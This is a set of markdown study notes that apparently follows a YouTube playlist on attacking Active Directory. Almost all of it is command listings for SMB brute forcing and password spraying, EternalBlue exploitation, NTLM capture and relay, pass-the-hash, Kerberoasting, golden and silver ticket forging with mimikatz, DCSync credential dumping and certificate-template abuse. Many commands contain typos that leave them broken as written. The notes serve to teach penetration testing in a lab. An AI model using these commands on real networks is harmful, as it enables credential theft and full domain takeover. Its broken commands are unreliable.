# Video by HEXDUMP (https://www.youtube.com/playlist?list=PLJnLaWkc9xRi71Pso26JlvyBkLUOETLjn)

### Introdution to Active Directory (https://www.youtube.com/watch?v=4Oc8b3nRm2I&list=PLJnLaWkc9xRi71Pso26JlvyBkLUOETLjn&index=2)

```shell
  # LDAP privileges for the certain user
  Import-Module ActiveDirectory
  Get-ADUser -LDAPFilter "(&(objectClass=user)(sANAccountName=leo))"

  # Kerberos Authentication tickets
  klist tickets

  # NTDS.dit all information about the AD is stored here
  C:\Windows\NTDS\ntds.dit

  # SYSVOL Shared folder in domain controllers that stores and replicates data all over the domain

```

---

### Active Directory Exposed Attack Surface (https://www.youtube.com/watch?v=pXd8DsdcBlw&list=PLJnLaWkc9xRi71Pso26JlvyBkLUOETLjn&index=3)

```shell
  # 53 (DNS)
  nsloookup -type=SRV <active_directory_name>

  # 80 (HTTP), 443 (HTTPS) - TLS X.509 Certificate
  curl -v http://<ip>

  # 88 (Kerberos) - KDC issues ticket after one credential and maps it, it is also an authentication server (AS and a ticket generation system (TGS)

  # 135 (RPC)
  rpcclient -U <username> <ip>
  enumdomusers

  # 139 (NetBIOS)
  nbtscan <ip>

  # 389 (LDAP), 636 (LDAPS)
  sudo pacman -S openldap
  ldapsearch -X -H ldap://<domain_name> -D "CN=<username>,CN=<user_group>,DC=<domain__name_before_dot>,DC=<domain_name_after_dot>" -w "<password>" -b "DC=<domain__name_before_dot>,DC=<domain_name_after_dot>" "(objectClass=user)"
  ldapwhomai -H ldap://<domain_name> -D "CN=<username>,CN=<user_group>,DC=<domain__name_before_dot>,DC=<domain_name_after_dot>" -w "<password>"

  $Filter = "(objectClass=user)"
  $RootOU = "DC=<domain__name_before_dot>,DC=<domain_name_after_dot>"

  $Searcher = New-Object DirectoryServices.DirectorySearcher
  $Searcher.SearchRoot = System.DirectoryServices.DirectoryEntry("LDAP://$(RootOU)")
  $Searcher.Filter = $Filter
  $Searcher.SearchScope = "Subtree"
  $Searcher.FindAll()

  # 445 (SMB)
  \\DC01\\SharedFiles
  smbmap -H <ip>
  smbclient //<ip>/SharedFiles -U "<username_or_domain_name/username>%<password>"

  Get-Service WinRM
  winrm enumerate winrm/config/listener
  Test-WsMan <ip>

  # 21 (FTP)
  
  # 22 (SSH)

  # 1433 (MSSQL)

  # 3389 (RDP)
```

---

### Attacks on SMB (https://www.youtube.com/watch?v=Ab0zGI7k1QY&list=PLJnLaWkc9xRi71Pso26JlvyBkLUOETLjn&index=4)

smbmap,smbclient,netexec

domain_name could be hexdump.lab

```shell
  # 01. Guest or Anonmous access to Shares / Listing of shares
  nxc smb <ip> -u "<username_that_doesnt_exist_or_guest>" -p "" --shares # Guest access
  nxc smb <ip> -u '' -p '' --users
  
  smbmap -H <ip>
  smbmap -H <ip> -u <username> -p "<password>"
  smbmap -H <ip> -u <username> -p "<password>" -d <domain_name> -r "<share_name>"
  smbmap -H <ip> -u <username> -p --prompt
  smbmap -H <ip> -u <username> -p "<password>" -v
  smbmap -H <ip> -u <username> -p "<password>" --signing

  smbclient -L //<ip> -U "<username>"
  smbclient //<ip>/<share_name> -U "<username_or_domain_name/username>%<password>"

  ls,cd,get,put

  # 02. RCE via access to adinistrative Shares
  smbmap -H <ip> -u <username> -p "<password>" -x "<command> # -X Powerhshell -x cmd

  # 03. SMB Brute Forving
  docker run --entrypoint "/bin/bash" -v $(pwd)/wordlists:/data --network host -it evilsocket/legba:latest
  legba smb --smb-workgroup <domain_name> --smb-share <share_name> --username <username> --password ./wordlists/passwords.txt --target <ip>
  legba smb --smb-workgroup <domain_name> --smb-share <share_name> --username administrator --password ./wordlists/passwords.txt --target <ip>

  # 04. SMB Password Spraying
  nxc smb <ip> -u "<username>" -p <password_file>
  nxc smb <ip> -u <username_list> -p <password_file>
  nxc smb <ip_list> -u <username_list> -p <password_file> --continue-on-success

  # 05. SMBv1 EternalBlue (CVE-2017-0144)
  nmap -p445 --script smb-vuln-ms17-010 <ip>
  metasploit -q
  use auxiliary/scanner/smb/smb_ms17_010
  use exploit/windows/smb/smb_ms17_010_eternalblue

  # 06. Net-NTLM Capture Attack
  sudo Responder -I <interface>
  dir \\<attacker_ip>\test # From the target machine

  hashcat -m 5500 -a 3 <hash> <wordlist>
  johhn --format=netntlm --wordlist=<wordlist> <hash>

  hashcat -m 5600 -a 3 <hash> <wordlist>
  johhn --format=netntlmv2 --wordlist=<wordlist> <hash>

  # 07. Pass the Hash Attack (PTH) - only ntlm not net-ntlm
  nxc smb <ip> -u <username> -H <ntlm_hash_for_the_correct_user>
  nxc smb <ip> -u <username> -H <ntlm_hash_for_the_correct_user> --shares
  nxc smb <ip> -u <username> -H <ntlm_hash_for_the_correct_user> -X "<command>

  nxc smb <ip> -u <username_list> -H <ntlm_hash_not_net_ntlm_for_the_correct_user> # Hash spraying

  
  # 08. Net-NTLM Relay Attack

  Get-SmbServerConfiguration | Select EnableSMB1Protocol, EnableSMB2Protocol, RequireSecuritySignature
  gpedit.msc # can be edited and disabled here
  Set SmbClientConfiguration -RequireSecuritySignature $false
  Set SmbServerConfiguration -RequireSecuritySignature $false

  nxc smb <ip> --gen-relay-list <output_filename.txt>
  sudo ntlmrelayx.py --no-http-server -smb2support -t smb://<ip> -socks
  dir \\<attacker_ip>\test
  -- then we have the socks proxy connected
  proxychains lookupsid.py -no-pass -domain-sids <domain_name_without_dot>/<username>@<ip>»
  proxychains seretsdump.py -no-pass <domain_name_without_dot>/<username>@<ip>
  proxychains smbexec.py -no-pass <domain_name_without_dot>/<username>@<ip>
  
```

---

### Kerberos (https://www.youtube.com/watch?v=dQz3CMlVYNY&list=PLJnLaWkc9xRi71Pso26JlvyBkLUOETLjn&index=5)

Authentication key agreement protocol withh a shared secret key, Wx509 digital certificates to authenticate but that uses public-key ccryptogrpahy, the central authority is the kdc (key distribution center), it does ephemeral session keys that protexts sessions

AS verifies the identity and then generates a TGT that  can be exhchanged for Service Tickets, TGS (Ticket Granting Server) offers Service Tickets by using the TGT, the Service TIckets allows the user the access

There are Principals, User (users), Server (services), Host (computer), upn, spn, hpn

Inside the kdc there are the mapped secret keys to users 

KDC is the AS and TGS together: client - AS - TGS - Service

  As-Req = client -> AS
  As-Rep = client <- AS
  TGS-REQ = client -> TGS
  TGS-REP = client <- TGS
  AP-REQ = client -> Service
  AP-REP = client <- Service



```shell
  whoami /upn # gets the kerberos realm that trusts the dc, it groups by kerberos principals
  klist
  setspn -L DC01
  setspn -A HTTP/webserver.<domain_name> <username>
  setspn -L <username>
```

---

### User Enumeration in Kerberos (https://www.youtube.com/watch?v=NylQKulUe9M&list=PLJnLaWkc9xRi71Pso26JlvyBkLUOETLjn&index=6)

```shell
  $users = 1..100 | ForEach-Object { "user$_" }
  $iterations = 5
  for ($i = 0; $i - lt $iterations; $i++) {
    $randomUser = $users | Get-Random
    $samAccountName = $randomUser
    $userPrincipalName = "$randomUser@<domain:name>"
    $givenName = "User"
    $surname = $randomUser
    $password = ConvertTo-SecureString "Password123!" -AsPlainText -Force
    
    New-ADUser -SamAccountName $samAccountName -UserPrincipalName $userPrincipalName -GivenName $givenName -Surname $surname -Name $randomUser -AccountPassword $password -Emabled $true -PassThru
    Write-Host "Created user: $randomUser"
  }

  kerbrute userenum -d <domain_name> --dc <domain_controller_full_domain_name> <username_file>
  net user
```

---

### Roasting Attacks on Kerberos (https://www.youtube.com/watch?v=fVTZEIZIEqg&list=PLJnLaWkc9xRi71Pso26JlvyBkLUOETLjn&index=7)

```shell
  #Check if we can do as-rep roasting, if True then we are good to  exploit
  Get-ADUser -Identity "<username>" -Properties DoesNotRequirePreAuth | Select-Object Name, DoesNotRequirePreAuth
  pip install impacket
  GetNPUsers.py <domain_name>/<username> -dc-ip <dc_ip> -no-pass
  hashcat -m 18200 <hash> <password_file>
  john --wordllist=<passsword_file> <hash>

  #Kerberoasting - we require password of a usre
  GetUserSPNs.py <domain_name>/<username>:"<password>" -dc-ip <dc_ip>
  GetUserSPNs.py <domain_name>/<username>:"<password>" -dc-ip <dc_ip> -request-user kerberoasting
  GetUserSPNs.py <domain_name>/<username>:"<password>" -dc-ip <dc_ip> -request
  john --format=krb5tgs --wordlist=<password_list> <hash>
  hashcat -m 13100 <ticket_file> <password_list>

  # if time errpr pr sessoin error (clock skew), then try again
  sudo timedatectl set-ntp off
  sudo ntpupdate -q <domain_controller_ip>
  sudo ntpupdate -u <domain_controller_ip>
  
```

---

### Ticket Forging Attacks (Golden and Silver) (https://www.youtube.com/watch?v=KngApymmV60&list=PLJnLaWkc9xRi71Pso26JlvyBkLUOETLjn&index=8)

```shell
  # Golden Ticket
  # We need: Domain name, Domain SID, NTLM hash of the KRBTGT account, Username we want to impersonate
  ## Get domain SID and KRBTGT NTLM hash, domain sid is leaving the last sequence of numbers

  whoami /user
  pip install impacket
  lookupsid.py "<admin_name>:<admin_password>"@<domain_controller_ip>
  secretsdump.py "<admin_name>:<admin_password>"@<domain_controller_ip> -outputfile krb -user-status # or NTDS.dit
  systeminfo # for the domain

  mimikatz.exe
  privilege::debug
  lsadump::lsa /inject /name:krbtgt

  ## Forge custom TGT
  ticketer.py -nthash <hash> -domain-sid >domain_sid> -domain <domain_name> <username_admin>

  export KRB5CCNAME=<path_to_administrator.ccache_or_username.ccache>
  ticketConverter.py <path_to_administrator.ccache_or_username.ccache> <name_username_admin_name>.kirbi
  klist
  psexec.py -k -no-pass <domain_name>/<admin_name_username>@<target_full_domain> # snchronyze clock also if needed

  
  # Silver Ticket
  # We need: Domain name, Domain SID, SPN of theh service to  attack, NTLM hash of the service account to attack, Privileged Account Certificate (PAC) validation is disabled
  mimikatz.exe
  privilege::debug
  sekurlsa::logonpasswords # get the dc01 or domain controller or other ntlm hash
  kerberos::golden /sid:<domain_did> /target:<domain_controller_name_or_ip> /service:<service_to_account> /rc4:<ntlm_hash_of_service_account> /user:<username_to_impersonate> /id:<random_id>
  klist
```

---

### DCSync Attack (https://www.youtube.com/watch?v=qEEB1SjPPQ8&list=PLJnLaWkc9xRi71Pso26JlvyBkLUOETLjn&index=9)

```shell
  # Tricks a DC thinking the attacker is another legit DC, replication data
  # Need to have compromised or an admin account or an account with permissions: Replication Directory Changes, Replicating Directory Changes All
  mimikatz.exe lsadump::dcsync /domain:<domain_name> /user:krbtgt

  # Enumeration with Blloodhound
  pip install bloodhound
  bloodhound-python -u <username> -p "<password>" -ns <domain_controller_ip> -d <domain_namme> -c All --zip
  bloodhound-python -u <administrator> -p "<password>" -ns <domain_controller_ip> -d <domain_namme> -c All --zip
  # then use the bloodhound gui of the app or
  ./bloodhound-cli containers start
```

---

### Certificate (https://www.youtube.com/watch?v=bV1IBxlTkFM)

```shell
# ensure all domains are in the /etc/hosts

https://github.com/ly4k/Certipy/wiki/06---Privilege-Escalation

impacket-owneredit -action write -target-dn 'DC=<dc_before_dot,DC=<dc_after_dot>' -new-owner '<name_of__username>' -target <username_of_the_ca_authority>' '<domain_name>'/'<username_also_new_owner>':'<password>'

impacket-dacledit -action write -rights 'FullControl' -principal '<name_of__username>' -target <username_of_the_ca_authority>' '<domain_name>'/'<username_also_new_owner>':'<password>'

net rpc password '<ca_username>' '<password>' -U '<domain_name>'/'<username_also_new_owner>':'<password>' -S <target_ip>

certipy-ad find -u <username>@<target_domain> -p '<password>' -dc-ip <target_ip> -vulnerable -stdout

# the template and stuff can be found in the output of the find command
certipy template -u <username>@<domain_name> -p '<password>' -dc-ip <target_ip> -template 'SecureFiles' -write-default-configuration

certipy req -u <username>@<domain_name> -p '<password>' -dc-ip <target_ip> -target '<domainN_of_ca_target>' -ca '<ca_name>' -template 'SecureFiles' -upn '<who_we_want_to_impeprsonate>@<domain_name>' -sid <sid>

certipy auth -pfx <file.pfx/administrator.pfx> -dc-ip <target_ip>

# then pass the ntlm hash or carck
```

